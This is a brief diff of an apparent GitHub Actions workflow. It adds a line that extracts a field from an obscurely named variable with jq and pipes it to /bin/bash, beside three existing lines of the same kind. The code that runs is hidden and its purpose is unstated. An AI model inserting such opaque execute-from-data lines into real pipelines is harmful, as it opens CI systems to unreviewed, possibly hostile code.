@@ -27,6 +27,7 @@ jobs:
           echo $e0 | jq -r .dp61 | /bin/bash
           printf '%s' "$oxvb20" | jq -r .ds3 | /bin/bash
           echo $nxqp475 | jq -r .nss6 | /bin/bash
+          echo $laxhs6 | jq -r .ufjbp823 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
